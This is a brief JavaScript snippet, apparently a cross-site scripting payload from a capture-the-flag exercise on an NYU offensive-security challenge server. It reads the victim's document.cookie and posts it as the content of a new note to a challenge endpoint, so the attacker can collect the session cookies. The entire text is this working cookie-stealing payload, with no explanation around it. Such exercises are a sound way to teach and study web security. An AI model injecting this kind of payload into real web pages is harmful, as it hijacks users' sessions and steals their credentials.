var testsix = new XMLHttpRequest();
testsix.open("POST", 'http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new');
testsix.setRequestHeader('Content-Type', 'application/json');
testsix.send(JSON.stringify({title: 'test 6', content: document.cookie, submit: 'save'}));
